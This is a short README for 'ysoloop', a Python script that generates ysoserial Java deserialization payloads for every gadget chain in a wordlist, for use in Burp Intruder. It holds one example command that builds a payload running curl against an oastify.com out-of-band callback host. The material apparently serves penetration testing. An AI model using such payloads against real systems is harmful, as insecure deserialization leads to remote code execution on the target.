# ysoloop
Utilities for insecure serialization

This repository was created for script utilities for exploiting insecure serializations.

YsoLoop.py is intended to generate all payloads that can be used in the insecure serialization exploitation process. It uses "wordlist.txt", which is a base for all possible YSoSerial payloads.

With the output of this script, it is possible to use it as a payload in tools such as Intruder (BurpSuite), or custom scripts.

Usage recommendation:
python3 YsoLoop.py > payloads.txt

Ps.1: To run the script, it must be located in the same directory as "ysoserial-all.jar" e a "wordlist.txt"
Ps.2: The payload command must be adjusted. Ex: base_command = "java -jar ysoserial-all.jar {} 'curl http://abcdefghijklm.oastify.com' | base64 -w0"

*Script still in the process of being improved.
